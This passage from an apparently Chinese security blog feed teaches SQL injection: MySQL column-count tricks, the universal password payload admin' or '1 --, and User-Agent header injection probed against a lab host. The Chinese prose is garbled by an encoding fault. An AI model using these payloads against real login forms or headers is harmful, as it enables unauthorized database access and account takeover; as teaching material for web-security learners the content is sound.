sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show warnings;</span><br><span class="line">+---------+------+-----------------------------------------------+</span><br><span class="line">| Level   | Code | Message                                       |</span><br><span class="line">+---------+------+-----------------------------------------------+</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;basswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;vassword&#x27; |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;gasswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passw&#x27;    |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;basswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;vassword&#x27; |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;gasswd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;passwd&#x27;   |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;pass&#x27;     |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;pas&#x27;      |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;ds&#x27;       |</span><br><span class="line">| Warning | 1292 | Truncated incorrect INTEGER value: &#x27;asd&#x27;      |</span><br><span class="line">+---------+------+-----------------------------------------------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br><span class="line">mysql&gt; select * from tuser where passwe</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;passwe&#x27; in &#x27;where clause&#x27;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œå¦‚æœè‡ªå·±æ„é€ çš„è¯ï¼Œä¹Ÿå¯ä»¥åœ¨ information_schemaé‡Œé¢åˆ¤æ–­æœ‰æ²¡æœ‰æŸåº“ï¼ŒæŸè¡¨ç­‰ã€‚</p><h1 id="limit-ä¸‹çš„å­—æ®µæ•°åˆ¤æ–­">limit ä¸‹çš„å­—æ®µæ•°åˆ¤æ–­</h1><p>ä½¿ç”¨ where æ¡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ order by åˆ¤æ–­å­—æ®µæ•°ï¼Œè€Œ limitåå¯ä»¥åˆ©ç”¨ <code>1,into @,@</code> ï¼ˆ<span class="citation"data-cites="ä¸ºå­—æ®µæ•°">@ä¸ºå­—æ®µæ•°</span>ï¼‰åˆ¤æ–­å­—æ®µæ•°</p><p>æ³¨ï¼š<span class="citation" data-cites="ä¸º">@ä¸º</span> mysql çš„User-Defined Variablesï¼Œå³ï¼šç”¨æˆ·å®šä¹‰å˜é‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ @ åœ¨ mysqlä¸­å®šä¹‰å˜é‡ï¼Œç±»ä¼¼ php ä¸­ä½¿ç”¨ $ å®šä¹‰å˜é‡ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@var</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="variable">@var</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="variable">@var</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å±•ç¤º limit 0,1 çŒœå­—æ®µæ•°ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser where id=1 limit 0,1 into @a,@b,@c;</span><br><span class="line">Query OK, 1 row affected (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tuser where id=1 limit 0,1 into @a,@b;</span><br><span class="line">ERROR 1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">mysql&gt; select @a;</span><br><span class="line">+------+</span><br><span class="line">| @a   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p>ä½¿ç”¨ select into è¯­å¥å°†æŸ¥è¯¢çš„ä¸€æ¡ï¼ˆæ³¨æ„ï¼š<span class="citation"data-cites="a">@a</span>ï¼Œ<span class="citation"data-cites="b">@b</span>ï¼Œ<span class="citation"data-cites="c">@c</span> ç­‰åªæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¸èƒ½æ¥å—å¤šæ¡æ•°æ®ï¼Œæ‰€ä»¥ limit byxï¼Œ1ï¼Œç¬¬äºŒä¸ªå‚æ•°åªèƒ½ä¸º1ï¼‰ï¼Œå‰åå­—æ®µæ•°ä¸ä¸€è‡´ï¼Œæ”¾ä¸è¿›å»å½“ç„¶å°±æŠ¥åˆ—æ•°ä¸ä¸€æ ·çš„é”™è¯¯ã€‚</p><p>æœªå®Œå¾…ç»­....</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlæ³¨å…¥ä»‹ç»</title>
      <link href="/blog/2019/08/02/websec/sql_injection/sql_jnjection_intro/"/>
      <url>/blog/2019/08/02/websec/sql_injection/sql_jnjection_intro/</url>
      
        <content type="html"><![CDATA[<p>2019 å¹´ 10 æœˆ 13 æ—¥ä¿®æ”¹å°‘è®¸</p><h2 id="å¼•ä¾‹ä¹‹ä¸‡èƒ½å¯†ç ">å¼•ä¾‹ä¹‹ä¸‡èƒ½å¯†ç </h2><blockquote><p>ç”¨æˆ·å: admin' or '1 --</p><p>å¯†ç :</p></blockquote><p>åŸç†ï¼šsql æ³¨å…¥ï¼ˆæœåŠ¡ç«¯æ¼æ´ï¼‰</p><h1 id="ä»€ä¹ˆæ˜¯-sql-æ³¨å…¥">ä»€ä¹ˆæ˜¯ SQL æ³¨å…¥ï¼Ÿ</h1><p>SQL Injection æ˜¯ä¸€ç§å¸¸è§çš„ Webå®‰å…¨æ¼æ´,æ”»å‡»è€…åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥è®¿é—®æˆ–ä¿®æ”¹æ•°æ®ï¼Œæˆ–è€…åˆ©ç”¨æ½œåœ¨çš„æ•°æ®åº“æ¼æ´è¿›è¡Œæ”»å‡»ã€‚</p><ol type="1"><li><p>æ­£å¸¸çš„ Web ç«¯å£è®¿é—®</p><p>æ­£å¸¸è®¿é—®æ˜¯ webå‡ºå•Šå¦‚ç¨‹åºè®¾è®¡è€…æ‰€å¸Œæœ›çš„å‚æ•°å€¼ï¼Œç”±ç¨‹åºæŸ¥è¯¢æ•°æ®åº“å®Œæˆå¤„ç†åï¼Œå‘ˆç°ç»“æœé¡µé¢ç»™ç”¨æˆ·ã€‚</p></li><li><p>SQL æ³¨å…¥æ˜¯å¦‚ä½•è®¿é—®ï¼Ÿ</p><p>1ï¼‰SQL æ³¨å…¥ä¹Ÿæ˜¯æ­£å¸¸çš„ web ç«¯å£è®¿é—®</p><p>2ï¼‰åªæ˜¯ä¼ å…¥çš„å‚æ•°å€¼å¹¶éæ˜¯ç¨‹åºè®¾è®¡è€…æ‰€æœŸæœ›çš„ï¼Œè€Œæ˜¯ä¼ å…¥äº†åµŒå¥— SQLä»£ç çš„å‚æ•°å€¼</p><p>3ï¼‰å‚æ•°å€¼åˆ©ç”¨ç¨‹åºå¤„ç†æ³¨å…¥è¿™çš„é€»è¾‘ï¼ŒæŒ‰ç…§æ³¨å…¥è€…çš„æœŸæœ›æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢</p><p>4ï¼‰ç”šè‡³é¡µé¢å‘ˆç°æŒ‰ SQL æ³¨å…¥è€…æœŸæœ›æ˜¾ç¤º</p></li></ol><p>SQL æ³¨å…¥ï¼šæ˜¯é€šè¿‡åº”ç”¨ç¨‹åºæŠŠå¸¦æœ‰ SQL ä»£ç çš„å‚æ•°ä¼ é€’ç»™æ•°æ®åº“</p><p>ä¸‡èƒ½å¯†ç å›é¡¾ï¼š</p><p>ç™»å½•è¯·æ±‚é€šå¸¸ä½¿ç”¨ post æ–¹å¼æäº¤è¡¨å•ï¼ŒæœåŠ¡å™¨é€šè¿‡ PHPè·å–ç”¨æˆ·åä¸å¯†ç ï¼Œç„¶åæ‹¼æ¥ä¸º sqlè¯­å¥ï¼Œç„¶åä»ç”¨æˆ·è¡¨ä¸­æŸ¥è¯¢ç”¨æˆ·å[ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·å]ï¼Œå¯†ç ä¸º[ç”¨æˆ·è¾“å…¥çš„å¯†ç çš„ MD5]ï¼ˆä¸€èˆ¬ä½¿ç”¨ MD5åŠ å¯†ï¼‰ï¼Œæ‰§è¡ŒæˆåŠŸï¼Œå°±è¿”å›ç”¨æˆ·åè¡¨ç¤ºç™»é™†æˆåŠŸã€‚</p><p>è€Œå¤„ç†ä¸‡èƒ½å¯†ç æ—¶ï¼Œé—­åˆã€æ³¨é‡Šï¼Œä½¿å¾—åªè¦æ•°æ®åº“çš„å¯¹åº”è¡¨ä¸­å­˜åœ¨è¯¥ç”¨æˆ·åæ—¶ï¼Œä¾¿æ‰§è¡ŒæˆåŠŸï¼Œç™»é™†æˆåŠŸã€‚</p><p>æ€»ç»“ï¼š</p><ol type="1"><li>è·å–ç”¨æˆ·è¯·æ±‚å‚æ•°</li><li>æ‹¼æ¥åˆ°ä»£ç ä¸­ï¼ˆè¿™ä¸ªæ‹¼æ¥è¿‡ç¨‹å¾ˆé‡è¦ï¼Œæ­£æ˜¯è¿™ä¸ªè¿‡ç¨‹å¤„ç†ä¸æ°å½“ï¼Œä½¿å¾—æ•°æ®ä¸ä»£ç çš„ç•Œé™æ··æ·†ï¼‰</li><li>SQL è¯­å¥æŒ‰ç…§æˆ‘ä»¬æ„é€ å‚æ•°çš„è¯­ä¹‰æ‰§è¡ŒæˆåŠŸã€‚</li></ol><h2 id="sql-æ³¨å…¥çš„å¿…å¤‡æ¡ä»¶"><strong>SQL æ³¨å…¥çš„å¿…å¤‡æ¡ä»¶ï¼š</strong></h2><ol type="1"><li>å¯ä»¥æ§åˆ¶è¾“å…¥çš„æ•°æ®</li><li>æœåŠ¡å™¨è¦æ‰§è¡Œçš„ä»£ç æ‹¼æ¥äº†æ§åˆ¶çš„æ•°æ®</li></ol><h2 id="sql-æ³¨å…¥çš„åŸå› ">SQL æ³¨å…¥çš„åŸå› </h2><p>æ ¹æœ¬åŸå› ï¼š</p><p>SQLæ³¨å…¥æ˜¯åº”ç”¨ç¨‹åºçš„é—®é¢˜ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿæˆ–è€…æ•°æ®åº“çš„é—®é¢˜ã€‚å…¶æœ¬è´¨æ˜¯äººå¯¹æ•°æ®å®‰å…¨çš„æ„è¯†è–„å¼±æˆ–è€…å³ä½¿æœ‰å®‰å…¨æ„è¯†è€Œç¨‹åºå‘˜å¯¹å¦‚ä½•é˜²èŒƒæ— ä»ä¸‹æ‰‹ã€‚å› æ­¤ï¼Œå¯¼è‡´ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥æ•°æ®çš„åˆæ³•æ€§è¿›è¡Œæ£€æŸ¥ï¼Œå¯¹ä¼ å…¥å‚æ•°çš„å®‰å…¨æ€§æ²¡æœ‰æ°å½“çš„è¿‡æ»¤ã€‚</p><p>æŠ€æœ¯åŸå› ï¼š</p><p>æ•°æ®å’Œä»£ç æœªåˆ†ç¦»ï¼Œå³æ•°æ®å½“åšäº†ä»£ç æ¥æ‰§è¡Œã€‚ï¼ˆç”¨ä¸€å¥<strong>ä¸å¤ªä¸¥è°¨</strong>çš„è¯æ¥è¯´ï¼Œå½“ç¨‹åºå¯¹å®¢æˆ·ç«¯æäº¤çš„æ•°æ®æœªä½œå¤„ç†æˆ–è½¬ä¹‰ç›´æ¥ä»£å…¥æ•°æ®åº“å°±é€ æˆäº†SQL æ³¨å…¥ï¼‰</p><p>è§£å†³æ–¹æ¡ˆï¼šæ•°æ®ä¸æŸ¥è¯¢æ¨¡å—ç‹¬ç«‹å¤„ç†ã€‚</p><h2 id="sql-æ³¨å…¥çš„å±å®³">SQL æ³¨å…¥çš„å±å®³</h2><ol type="1"><li>è·å–æ•°æ®åº“ä¿¡æ¯<ol type="1"><li>ç®¡ç†å‘˜åå°ç”¨æˆ·åå’Œå¯†ç </li><li>è·å–å…¶ä»–æ•°æ®åº“æ•æ„Ÿä¿¡æ¯ï¼šç”¨æˆ·åã€å¯†ç ç­‰</li><li>è„±åº“</li></ol></li><li>è·å–æœåŠ¡å™¨æƒé™</li><li>æ¤å…¥ Webshellï¼Œè·å–æœåŠ¡å™¨åé—¨ï¼ˆselect into outfile æˆ– mysql æ—¥å¿—å†™webshellï¼‰</li><li>è¯»å–æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶</li><li>ä¸‡èƒ½å¯†ç </li></ol><p>æ„Ÿæƒ³ï¼š</p><p>ç›®å‰ï¼Œäº’è”ç½‘ä¸Š sqlæ³¨å…¥ä¹Ÿå­˜åœ¨ä¸å°‘ï¼ˆä¸è¿‡ï¼Œäº’è”ç½‘æ¯•ç«Ÿéƒ½è¿™ä¹ˆå¤§ã€‚ã€‚ï¼‰ï¼Œå› ä¸ºä»ç„¶æœ‰å¾ˆå¤šç½‘ç«™å¼€å‘è€…ï¼Œç®¡ç†å‘˜ç­‰å®‰å…¨æ„è¯†ã€å®‰å…¨å¼€å‘æŠ€æœ¯ä¸é«˜ç­‰ã€‚ä½†æ•´ä½“ä¸Šï¼Œäººä»¬å¯¹äºç½‘ç»œçš„å®‰å…¨æ„è¯†å·²ç»æå‡äº†å¾ˆå¤šï¼Œç›¸æ¯”ä»¥å‰ï¼Œç½‘ç»œå®‰å…¨å·²ç»è¿›äº†ä¸€å¤§æ­¥ã€‚ç”±äºsqlæ³¨å…¥çš„ä¸€äº›ç‰¹ç‚¹ï¼šå½¢å¼ç®€å•ã€å±å®³å¤§ã€å¥½å¤ç°ã€å¥½ä¿®å¤ç­‰ï¼Œå¾ˆå¤šæœ‰äº›å®‰å…¨æ„è¯†çš„ï¼Œæ²¡èƒ½åŠ›çš„ä¸Šä¹™æ–¹çš„WAFï¼Œæœ‰èƒ½åŠ›çš„è‡ªå·±ç ”å‘å®‰å…¨äº§å“ï¼Œä½¿å¾— salæ³¨å…¥æ¯”è¾ƒå°‘å‡ºç°äº†ã€‚ï¼ˆåœ¨é‚£äº›æœ‰å®‰å…¨æ„è¯†çš„å‚å®¶ï¼‰ã€‚ä½†æ˜¯ï¼Œé“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå¾ˆå¤šWAFäº§å“æœ¬èº«è®¾è®¡æˆ–è¿‡æ»¤ç­‰å°±å­˜åœ¨ç¼ºé™·ï¼ŒåŸºç¡€çš„ç»•è¿‡ä¸è¡Œï¼Œæˆ‘ä»¬è¿˜æœ‰é«˜çº§çš„ç»•è¿‡æ–¹å¼ï¼Œæ‰€ä»¥è¯´é—¨æ§›é«˜äº†ï¼Œè¦å­¦çš„å¤šäº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>httpå¤´éƒ¨æ³¨å…¥</title>
      <link href="/blog/2019/07/30/websec/sql_injection/http_header_%20injection/"/>
      <url>/blog/2019/07/30/websec/sql_injection/http_header_%20injection/</url>
      
        <content type="html"><![CDATA[<h1 id="http-å¤´éƒ¨æ³¨å…¥ç®€ä»‹">http å¤´éƒ¨æ³¨å…¥ç®€ä»‹</h1><p>æ ¹æ®å¸¸è§æ€§ä¾æ¬¡æœ‰ï¼šUser-Agentã€cookieã€X-Forwarded-Forã€Client-IPã€Refererã€Hostç­‰ã€‚</p><p><a href="https://www.jianshu.com/p/792048d08ebc">X-Forwarded-Forçš„ä¸€äº›ç†è§£</a></p><h2 id="http-å¤´éƒ¨è¯¦è§£">HTTP å¤´éƒ¨è¯¦è§£</h2><p>User-Agentï¼šä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿè¯†åˆ«å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œæ¸¸è§ˆå™¨ç‰ˆæœ¬ç­‰.ï¼ˆå¾ˆå¤šæ•°æ®é‡å¤§çš„ç½‘ç«™ä¸­ä¼šè®°å½•å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿæˆ–æµè§ˆå™¨ç‰ˆæœ¬ç­‰å­˜å…¥æ•°æ®åº“ä¸­ï¼‰</p><p>Cookieï¼šç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ã€è¿›è¡Œ sessionè·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰.</p><p>X-Forwarded-Forï¼šç®€ç§° XFF å¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯ HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„ IP,ï¼ˆé€šå¸¸ä¸€äº›ç½‘ç«™çš„é˜²æ³¨å…¥åŠŸèƒ½ä¼šè®°å½•è¯·æ±‚ç«¯çœŸå® IPåœ°å€å¹¶å†™å…¥æ•°æ®åº“ or æŸæ–‡ä»¶[é€šè¿‡ä¿®æ”¹ XXF å¤´å¯ä»¥å®ç°ä¼ªé€  IP]ï¼‰.</p><p>Clien-IPï¼šåŒä¸Šï¼Œä¸åšè¿‡å¤šä»‹ç».</p><p>Rerfererï¼šæµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„.</p><p>Hostï¼šå®¢æˆ·ç«¯æŒ‡å®šè‡ªå·±æƒ³è®¿é—®çš„ WEB æœåŠ¡å™¨çš„åŸŸå/IP åœ°å€å’Œç«¯å£å·</p><h2 id="æ³¨å…¥å§¿åŠ¿">æ³¨å…¥å§¿åŠ¿</h2><p>é¦–å…ˆä»‹ç»ï¼Œæˆ‘è®¤ä¸ºæµ‹è¯• http -header å¤´éƒ¨çš„æ­£ç¡®å§¿åŠ¿</p><p>é¦–å…ˆæ³¨å†Œè¯¥ç½‘ç«™è´¦å·ï¼ˆè¿™é‡Œæ³¨æ„ä¸€èˆ¬æ³¨å†Œæ—¶ç”¨æˆ·åå’Œå¯†ç ä¸è¦æ˜¯ä¸€æ ·çš„ï¼Œè¦æœ‰åŒºåˆ†åº¦ã€‚ï¼‰ï¼Œå…ˆç”¨æ­£ç¡®çš„è´¦å·å¯†ç æµ‹è¯•ï¼Œå› ä¸ºæ®æˆ‘è§‚æµ‹ï¼šåœ¨ç™»å½•ï¼ˆä¸ç®¡è´¦å·å¯†ç æ­£ç¡®ä¸å¦ï¼‰æ—¶ï¼Œéƒ½ä¼šæœ‰user-agent ä¸ refererï¼ˆå¦‚æœè¯´çš„ä¸å¯¹ï¼Œè¿˜è¯·å¤§ä½¬æŒ‡æ•™ã€‚ï¼‰ï¼Œcookieåˆæ¬¡ç™»å½•æˆåŠŸä¹‹åæ‰ä¼šæœ‰ï¼ˆæ‰€ä»¥æµ‹è¯• cookieæ˜¯éœ€è¦æœ‰ä¸€ä¸ªè´¦å·å¯†ç çš„ï¼‰å½“ç„¶ï¼Œä½ è¦æ˜¯æµ‹è¯• postæ³¨å…¥ä»€ä¹ˆçš„å°±æ²¡æœ‰å¿…è¦æ³¨å†Œè´¦å·äº†ã€‚è¿™é‡Œæ˜¯æŒ‡ http header æ³¨å…¥ã€‚</p><p>ä¸‹é¢ä»‹ç»ä¸¤ç§æ³¨å…¥å§¿åŠ¿ï¼š</p><p>å“ªç§å§¿åŠ¿é€‚åˆä½ ï¼Œä½ å°±é€‰æ‹©å“ªç§ã€‚</p><ol type="1"><li>ä½¿ç”¨ hackbar åœ¨ post æ•°æ®å¤„ï¼Œè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶æ‰“å¼€ hackbarä¸­ user agentï¼Œé€šè¿‡æŸ¥çœ‹ network ä¸­çš„è¯·æ±‚ï¼Œå¤åˆ¶è‡ªå·±çš„ useragent æ ‡è¯†ï¼Œåˆ°hackbar çš„ useragent å¤„ï¼Œ</li><li>ä½¿ç”¨ burp repeater æŠ“åŒ…ï¼Œç„¶åè¿›è¡Œé‡æ”¾ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œrepeater ä¸­çš„render æ¸²æŸ“åŠŸèƒ½è¿˜è¡Œï¼Œå¯ä»¥ç›´æ¥æ¸²æŸ“å‡ºé¡µé¢ã€‚</li></ol><p>æ³¨ï¼šæœ¬æ¥ç”¨ hackbar ä¿®æ”¹ referer å¤´ï¼Œä½†æ˜¯ä¸ç®¡ç”¨ï¼Œåæ¥å‘ç°ï¼Œhackbaræ²¡æœ‰æ”¹æ‰ refererï¼Œä¸€ä¸ª bugï¼ˆå¯èƒ½æ˜¯ç”±äº chromeæŸäº›æ”¹è¿›çš„å‚æ•°å¯¼è‡´ï¼Œæ³¨æ„å½“ä½ æ„Ÿè§‰ä½¿ç”¨ä¸€ä¸ªå·¥å…·äº§ç”Ÿçš„ç»“æœä¸æƒ³çš„ä¸ä¸€æ ·çš„è¯ï¼Œä¸å¦¨è¯•è¯•åˆ«çš„å·¥å…·ã€‚æˆ–è€…é€šè¿‡åˆ«çš„æ–¹å¼éªŒè¯ä¸€ä¸‹ã€‚ï¼‰ï¼Œæœ€åä½¿ç”¨burp suite å§ã€‚ï¼ˆä¸‹é¢çš„å›æ˜¾æŠ¥é”™å¯ä»¥åœ¨ burp repeater çš„æŠ¥æ–‡æˆ–<strong>render æ¸²æŸ“é‡Œé¢çœ‹åˆ°</strong>ï¼Œå»ºè®®å» renderçœ‹ï¼Œå› ä¸ºæœ‰ä¸€äº›å­—ç¬¦æŠ¥æ–‡ä¸­æ˜¾ç¤ºä¸å‡ºæ¥ï¼‰ã€‚æˆ‘ä»¬ä¸æ˜¯å¤§ç¥ï¼Œä¸å¯èƒ½é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œæ²¡æœ‰å®Œç¾çš„å·¥å…·å°±è‡ªå·±å†™ä¸€ä¸ªå·¥å…·ã€‚æ¯ç§å·¥å…·éƒ½æœ‰å®ƒçš„ä¼˜ç¼ºç‚¹ï¼Œæˆ‘ä»¬è¦å–„äºåˆ©ç”¨å®ƒçš„ä¼˜ç‚¹ï¼Œé¿å…å®ƒçš„ç¼ºç‚¹ã€‚åœ¨web å®‰å…¨ä¸­æœ‰æ—¶å¹²ä¸€ä»¶äº‹æƒ…ï¼Œéœ€è¦ç”¨åˆ°å‡ ä¸ªå·¥å…·ï¼Œè¿™æ˜¯å¾ˆæ­£å¸¸çš„äº‹æƒ…ã€‚</p><h1 id="user-agent-æ³¨å…¥">user-agent æ³¨å…¥</h1><p><strong>æˆ‘çŒœæµ‹</strong>ï¼šç½‘ç«™è®°å½•ç”¨æˆ·çš„ user-agentå­˜å…¥æ•°æ®åº“ï¼ˆ<strong>æ€ä¹ˆå­˜ï¼Ÿå½“ç„¶æ˜¯ä½¿ç”¨ insertè¯­å¥å•¦ï¼Œè¿™æ˜¯æˆ‘ä»¬è¦çŸ¥é“çš„ã€‚</strong>ï¼‰ï¼Œä¸€æ–¹é¢æ˜¯ä¸ºäº†è¯†åˆ«ç”¨æˆ·è®¾å¤‡ï¼Œå¦ä¸€æ–¹é¢ï¼Œç”±äºè®¾å¤‡ä¸åŒï¼Œå¯èƒ½ä¼šæœ‰ä¸åŒçš„ä¼˜åŒ–/å¤„ç†å§ã€‚</p><p>ä¸‹é¢ç†Ÿæ‚‰çš„æµç¨‹æ­¥éª¤åˆæ¥äº†ï¼Œç°åœ¨å°±æŠŠ useragent å½“æˆä½  postæ³¨å…¥æ—¶çš„è¾“å…¥æ¡†ï¼Œæµç¨‹å¤§è‡´ä¸€æ ·ã€‚</p><h2 id="æµ‹è¯•æ³¨å…¥ç‚¹">æµ‹è¯•æ³¨å…¥ç‚¹</h2><p>åœ¨ useragentå†…å®¹çš„åé¢æµ‹è¯•å•å¼•å·/åŒå¼•å·/å•å¼•å·æ‹¬å·/åŒå¼•å·æ‹¬å·/å•å¼•å·åŒæ‹¬å·/åŒå¼•å·åŒæ‹¬å·/ç­‰ã€‚ çœ‹é¡µé¢å˜åŒ–åŠæŠ¥é”™ã€‚</p><p>æœ‰çš„æ—¶å€™æ˜¯ç›´æ¥æŠ¥é”™è¯­å¥ï¼Œæœ‰çš„æ—¶å€™ï¼Œè¿”å› 401Unauthorzedï¼Œå…·ä½“çœ‹æƒ…å†µã€‚</p><p>æˆ‘çš„æµ‹è¯• payloadï¼š</p><blockquote><p>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/75.0.3770.142 Safari/537.36'</p></blockquote><p>å›æ˜¾ï¼š</p><blockquote><p>You have an error in your SQL syntax; check the manual thatcorresponds to your MySQL server version for the right syntax to usenear '192.168.107.1', 'admin')' at line 1</p></blockquote><p>æ³¨å…¥ç‚¹å­˜åœ¨ã€‚</p><h2 id="åˆ¤æ–­æ³¨å…¥ç±»å‹">åˆ¤æ–­æ³¨å…¥ç±»å‹</h2><p>æ ¹æ®æŠ¥é”™ï¼š192.168.107.1', 'admin')ï¼Œè¿™é‡ŒçŒœæµ‹è¯¥ç½‘ç«™é€šè¿‡å°† user agentæ’å…¥äº†æ•°æ®åº“æ¥éªŒè¯èº«ä»½ï¼ˆå½“ç„¶ï¼Œç›®å‰æ®æˆ‘æ‰€çŸ¥å°±ä¸¤ç§ï¼šä¸€ç§æ˜¯ä¸å­˜å‚¨ï¼Œä¸€ç§æ˜¯insert æ’å…¥ï¼ŒæŠ¥é”™äº†ï¼Œè‚¯å®šå°±æ˜¯ insert å­˜å‚¨äº†å‘—ï¼‰è¿™é‡Œç”±äºç”¨æˆ·åä¸å¯†ç æ˜¯ä¸€æ ·çš„ï¼Œä¸èƒ½åŒºåˆ†ï¼Œadminæ˜¯å•¥ï¼Œä¸è¿‡ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¹Ÿæ²¡å…³ç³»ï¼ˆä½†æ˜¯ï¼Œåˆ«çš„æƒ…å†µå¯èƒ½å°±æœ‰å…³ç³»äº†ã€‚è´¦å·å¯†ç è¿˜æ˜¯ä¸è¦ç›¸åŒçš„å¥½ï¼‰çŒœæµ‹å¤§è‡´ sql æŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into tbl_name <span class="title function_ invoke__">values</span>(<span class="variable">$useragent</span>,<span class="variable">$ip</span>,<span class="variable">$useraname</span>/<span class="variable">$password</span>);</span><br></pre></td></tr></table></figure><p>å³ï¼šinsert è¯­å¥ã€ä¸‰ä¸ªå­—æ®µã€å­—æ®µç”¨å•å¼•å·åŒ…è£¹</p><h2 id="æ„é€ æœ‰æ•ˆ-payload">æ„é€ æœ‰æ•ˆ payload</h2><p>è¿™é‡Œä¸æ˜¯ select å°±åˆ«ç”¨ä»€ä¹ˆ order by äº†ï¼Œä¹Ÿå°±æ²¡æœ‰æ˜¾ç¤ºä½ä¸€è¯´äº†ã€‚</p><p>å¯¹äº insert è¯­å¥æ³¨å…¥çš„è¯ï¼Œä¸€èˆ¬å°±æ˜¯ç›²æ³¨äº†ï¼ŒæŠ¥é”™ã€å¸ƒå°”ã€æ—¶é—´ä¸‰ç§ã€‚</p><p>æ³¨ï¼šç”±äºè®¾å¤‡çš„ User-Agent å¤ªé•¿äº†ï¼Œä¸‹é¢æˆ‘ç”¨ Mozilla/5.0 ä»£æ›¿å…¨éƒ¨User-Agent å†…å®¹ï¼Œå³ï¼šMozilla/5.0 (Windows NT 